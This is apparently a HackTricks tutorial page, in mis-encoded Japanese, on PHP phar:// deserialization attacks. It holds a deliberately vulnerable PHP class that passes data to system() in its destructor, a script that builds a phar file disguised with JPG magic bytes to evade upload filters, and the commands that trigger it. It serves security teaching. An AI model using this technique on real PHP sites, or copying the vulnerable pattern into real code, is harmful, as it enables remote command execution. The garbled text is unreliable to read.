# phar:// ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ’ãƒ³ãƒˆ**ï¼š**Intigriti**ã«**ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯**ãƒãƒƒã‚«ãƒ¼ã«ã‚ˆã£ã¦ã€ãƒãƒƒã‚«ãƒ¼ã®ãŸã‚ã«ä½œã‚‰ã‚ŒãŸãƒ—ãƒ¬ãƒŸã‚¢ãƒ ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã§ã™ï¼ä»Šæ—¥ã€[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ã«å‚åŠ ã—ã€æœ€å¤§**$100,000**ã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã‚’ç²å¾—ã—å§‹ã‚ã¾ã—ã‚‡ã†ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

**Phar**ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆPHPã‚¢ãƒ¼ã‚«ã‚¤ãƒ–ï¼‰ãƒ•ã‚¡ã‚¤ãƒ«ã¯**ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå½¢å¼ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å«ã‚“ã§ã„ã¾ã™**ã€‚ã—ãŸãŒã£ã¦ã€è§£æã•ã‚Œã‚‹ã¨ã€ã“ã®**ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿**ã¯**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**ã•ã‚Œã€**PHP**ã‚³ãƒ¼ãƒ‰å†…ã®**ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚º**è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®ç‰¹æ€§ã®æœ€ã‚‚è‰¯ã„ç‚¹ã¯ã€**file\_get\_contents()ã€fopen()ã€file()ã€file\_exists()ã€md5\_file()ã€filemtime()ã€filesize()**ã®ã‚ˆã†ãªPHPã‚³ãƒ¼ãƒ‰ã‚’è©•ä¾¡ã—ãªã„PHPé–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ã‚‚ã€ã“ã®ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºãŒç™ºç”Ÿã™ã‚‹ã“ã¨ã§ã™ã€‚

ã—ãŸãŒã£ã¦ã€ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚µã‚¤ã‚ºã‚’**`phar://`**ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦å–å¾—ã™ã‚‹PHPã‚¦ã‚§ãƒ–ãŒã‚ã‚‹çŠ¶æ³ã‚’æƒ³åƒã—ã¦ãã ã•ã„ã€‚ãã—ã¦ã€ã‚³ãƒ¼ãƒ‰å†…ã«æ¬¡ã®ã‚ˆã†ãª**ã‚¯ãƒ©ã‚¹**ãŒè¦‹ã¤ã‹ã‚Šã¾ã™ï¼š

{% code title="vunl.php" %}
```php
<?php
class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

filesize("phar://test.phar"); #The attacker can control this path
```
{% endcode %}

**phar**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã€èª­ã¿è¾¼ã¾ã‚Œã‚‹ã¨ã“ã®ã‚¯ãƒ©ã‚¹ã‚’**æ‚ªç”¨ã—ã¦ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰**ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚æ¬¡ã®ã‚ˆã†ã«ï¼š

{% code title="create_phar.php" %}
```php
<?php

class AnyClass {
public $data = null;
public function __construct($data) {
$this->data = $data;
}

function __destruct() {
system($this->data);
}
}

// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new AnyClass('whoami');
$phar->setMetadata($object);
$phar->stopBuffering();
```
{% endcode %}

æ³¨æ„ã—ã¦ãã ã•ã„ã€**JPGã®ãƒã‚¸ãƒƒã‚¯ãƒã‚¤ãƒˆ**ï¼ˆ`\xff\xd8\xff`ï¼‰ãŒpharãƒ•ã‚¡ã‚¤ãƒ«ã®å…ˆé ­ã«è¿½åŠ ã•ã‚Œã¦ã€**å¯èƒ½ãª**ãƒ•ã‚¡ã‚¤ãƒ«**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã®**åˆ¶é™**ã‚’**å›é¿**ã—ã¦ã„ã¾ã™ã€‚\
`test.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ¬¡ã®ã‚ˆã†ã«**ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«**ã—ã¾ã™ï¼š
```bash
php --define phar.readonly=0 create_phar.php
```
`whoami` ã‚³ãƒãƒ³ãƒ‰ã‚’è„†å¼±ãªã‚³ãƒ¼ãƒ‰ã‚’æ‚ªç”¨ã—ã¦å®Ÿè¡Œã—ã¾ã™:
```bash
php vuln.php
```
### å‚è€ƒæ–‡çŒ®

{% embed url="https://blog.ripstech.com/2018/new-php-exploitation-technique/" %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®ãƒ’ãƒ³ãƒˆ**: **ã‚µã‚¤ãƒ³ã‚¢ãƒƒãƒ—**ã—ã¦**Intigriti**ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ã€‚ã“ã‚Œã¯**ãƒãƒƒã‚«ãƒ¼ã«ã‚ˆã£ã¦ã€ãƒãƒƒã‚«ãƒ¼ã®ãŸã‚ã«ä½œã‚‰ã‚ŒãŸãƒ—ãƒ¬ãƒŸã‚¢ãƒ ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ **ã§ã™ï¼ä»Šæ—¥ã€[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ã«å‚åŠ ã—ã¦ã€æœ€å¤§**$100,000**ã®ãƒã‚¦ãƒ³ãƒ†ã‚£ã‚’ç²å¾—ã—å§‹ã‚ã¾ã—ã‚‡ã†ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
